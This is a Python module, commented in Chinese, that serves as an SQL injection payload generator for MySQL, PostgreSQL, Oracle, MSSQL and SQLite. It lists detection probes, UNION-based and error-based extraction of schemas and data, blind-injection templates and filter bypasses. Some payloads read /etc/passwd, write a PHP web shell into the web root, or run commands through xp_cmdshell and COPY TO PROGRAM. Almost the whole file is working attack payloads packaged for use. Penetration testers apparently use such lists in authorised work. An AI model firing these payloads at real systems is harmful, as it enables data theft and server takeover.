"""SQL 注入 Payload 生成器.

覆盖:
    - 联合查询注入 (UNION SELECT)
    - 报错注入 (Error-based)
    - 布尔盲注 (Boolean-based)
    - 时间盲注 (Time-based)
    - 堆叠查询 (Stacked Queries)
    - 宽字节注入 (Wide-byte)
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  检测 Payload
# ═══════════════════════════════════════════════════════════

DETECTION: Dict[str, List[str]] = {
    "基础探测": [
        "'", '"', '`',
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "' OR 1=1-- ",
        "' OR 1=1#",
        "admin' -- ",
        "admin' #",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    "数字型注入": [
        "1 OR 1=1",
        "1 AND 1=1",
        "1 AND 1=2",
        "0 OR 1=1-- ",
        "-1 OR 1=1-- ",
        "-1' OR 1=1-- ",
    ],
    "ORDER BY / 列数探测": [
        "' ORDER BY 1-- ",
        "' ORDER BY 2-- ",
        "' ORDER BY 3-- ",
        "' ORDER BY 10-- ",
        "' ORDER BY 100-- ",
    ],
    "UNION SELECT 探测": [
        "' UNION SELECT NULL-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL-- ",
        "' UNION SELECT 1,2,3-- ",
        "' UNION SELECT 1,2,3,4,5-- ",
        "' UNION SELECT @@version,NULL-- ",
    ],
    "数据库指纹": [
        "' UNION SELECT @@version,NULL-- ",         # MySQL / MSSQL
        "' UNION SELECT version(),NULL-- ",          # PostgreSQL
        "' UNION SELECT banner,NULL FROM v$version-- ",  # Oracle
        "' UNION SELECT sqlite_version(),NULL-- ",   # SQLite
        "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- ",
    ],
}


# ═══════════════════════════════════════════════════════════
#  利用 Payload
# ═══════════════════════════════════════════════════════════

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    "MySQL": [
        {
            "name": "获取数据库名",
            "payload": "' UNION SELECT database(),NULL,NULL-- ",
        },
        {
            "name": "获取所有数据库",
            "payload": "' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata-- ",
        },
        {
            "name": "获取表名 (当前库)",
            "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- ",
        },
        {
            "name": "获取列名 (指定表)",
            "payload": "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- ",
        },
        {
            "name": "读取数据",
            "payload": "' UNION SELECT group_concat(COL1,0x3a,COL2),NULL,NULL FROM TABLE_NAME-- ",
        },
        {
            "name": "读文件 (需要 FILE 权限)",
            "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- ",
        },
        {
            "name": "写文件 (需要 FILE 权限)",
            "payload": "' UNION SELECT '<?php system($_GET[1]);?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- ",
        },
        {
            "name": "报错注入 - extractvalue",
            "payload": "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- ",
        },
        {
            "name": "报错注入 - updatexml",
            "payload": "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- ",
        },
        {
            "name": "报错注入 - GTID",
            "payload": "' AND gtid_subset(concat(0x7e,(SELECT database()),0x7e),1)-- ",
        },
        {
            "name": "时间盲注 - sleep",
            "payload": "' AND IF(1=1,sleep(5),0)-- ",
        },
        {
            "name": "时间盲注 - benchmark",
            "payload": "' AND IF(1=1,benchmark(5000000,sha1('test')),0)-- ",
        },
        {
            "name": "堆叠查询",
            "payload": "'; SELECT database();-- ",
        },
        {
            "name": "读取源码 - information_schema",
            "payload": "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ",
        },
        {
            "name": "Bypass 空格过滤 - /**/",
            "payload": "'/**/UNION/**/SELECT/**/1,2,3--",
        },
        {
            "name": "Bypass 空格过滤 - ()",
            "payload": "'UNION(SELECT(1),(2),(3))--",
        },
        {
            "name": "Bypass 逗号过滤 - JOIN",
            "payload": "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- ",
        },
        {
            "name": "Bypass 等号过滤 - LIKE",
            "payload": "' OR 1 LIKE 1-- ",
        },
        {
            "name": "宽字节注入 (GBK)",
            "payload": "%df' OR 1=1-- ",
        },
    ],
    "PostgreSQL": [
        {
            "name": "获取数据库名",
            "payload": "' UNION SELECT current_database(),NULL-- ",
        },
        {
            "name": "获取表名",
            "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- ",
        },
        {
            "name": "获取列名",
            "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- ",
        },
        {
            "name": "RCE - COPY FROM PROGRAM",
            "payload": "'; COPY (SELECT '') TO PROGRAM 'id'-- ",
        },
        {
            "name": "读取文件 - pg_read_file",
            "payload": "' UNION SELECT pg_read_file('/etc/passwd'),NULL-- ",
        },
        {
            "name": "读取文件 - lo_import",
            "payload": "' UNION SELECT lo_import('/etc/passwd'),NULL-- ",
        },
    ],
    "Oracle": [
        {
            "name": "获取表名",
            "payload": "' UNION SELECT table_name,NULL FROM all_tables-- ",
        },
        {
            "name": "获取列名",
            "payload": "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME'-- ",
        },
        {
            "name": "报错注入 - CTXSYS",
            "payload": "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version))-- ",
        },
    ],
    "MSSQL (SQL Server)": [
        {
            "name": "获取数据库名",
            "payload": "' UNION SELECT DB_NAME(),NULL-- ",
        },
        {
            "name": "获取表名",
            "payload": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- ",
        },
        {
            "name": "获取列名",
            "payload": "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('TABLE_NAME')-- ",
        },
        {
            "name": "RCE - xp_cmdshell",
            "payload": "'; EXEC xp_cmdshell 'whoami'-- ",
        },
        {
            "name": "启用 xp_cmdshell",
            "payload": "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- ",
        },
    ],
    "SQLite": [
        {
            "name": "获取表名",
            "payload": "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'-- ",
        },
        {
            "name": "获取列名 (SQL)",
            "payload": "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='TABLE_NAME'-- ",
        },
        {
            "name": "读取数据",
            "payload": "' UNION SELECT group_concat(COL1||':'||COL2),NULL FROM TABLE_NAME-- ",
        },
    ],
}


# ═══════════════════════════════════════════════════════════
#  布尔盲注 / 时间盲注 逐字符提取模板
# ═══════════════════════════════════════════════════════════

BLIND_TEMPLATES: Dict[str, str] = {
    "布尔盲注 (MySQL)": "1' AND SUBSTRING((SELECT database()),{pos},1)='{char}'-- ",
    "布尔盲注 (MySQL-LIKE)": "1' AND (SELECT database()) LIKE '{prefix}%'-- ",
    "时间盲注 (MySQL)": "1' AND IF(SUBSTRING((SELECT database()),{pos},1)='{char}',sleep(2),0)-- ",
    "时间盲注 (PostgreSQL)": "1' AND (SELECT CASE WHEN SUBSTRING(current_database(),{pos},1)='{char}' THEN pg_sleep(2) ELSE pg_sleep(0) END)-- ",
    "时间盲注 (MSSQL)": "1'; IF SUBSTRING((SELECT DB_NAME()),{pos},1)='{char}' WAITFOR DELAY '0:0:2'-- ",
    "时间盲注 (Oracle)": "1' AND (SELECT CASE WHEN SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),{pos},1)='{char}' THEN dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual)-- ",
    "二分法盲注 (MySQL)": "1' AND ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid}-- ",
}


def get_detection(db_type: str = "") -> dict:
    """获取检测 Payload."""
    if db_type and db_type in DETECTION:
        return {db_type: DETECTION[db_type]}
    return DETECTION


def get_exploit(db_type: str = "") -> dict:
    """获取利用 Payload."""
    if db_type and db_type in EXPLOIT:
        return {db_type: EXPLOIT[db_type]}
    return EXPLOIT


def get_blind_template(db_type: str = "") -> dict:
    """获取盲注模板."""
    if db_type:
        return {k: v for k, v in BLIND_TEMPLATES.items() if db_type.lower() in k.lower()}
    return BLIND_TEMPLATES


def search_payload(keyword: str) -> list:
    """在所有 Payload 中搜索."""
    results = []
    for category, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("name", "").lower():
                results.append({"category": category, **p})
    return results
